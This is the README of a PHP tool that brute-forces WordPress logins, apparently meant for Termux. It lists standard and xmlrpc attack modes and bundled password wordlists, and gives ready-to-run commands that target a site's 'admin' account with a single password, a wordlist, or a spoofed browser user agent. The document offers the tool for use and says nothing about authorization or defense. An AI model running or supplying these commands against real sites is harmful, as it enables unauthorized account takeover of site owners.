# WordPress Brute Force Login

Install Requirement
-------------------
```bash
pkg install php
```

Features
--------
* Standard mode or xmlrpc brute force mode
* http and https protocols supported
* 3 file Wordlist Added up to 1000+ word

Usage
-----
* No Wordlist
```bash
php wp -t site.com -u admin -p admin
```
* Using Wordlist
```bash
php wp -t site.com -u admin -l pass.txt
```
* Custom User Agent
```bash
php wp -t site.com -u admin -l pass.txt -g="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15"
```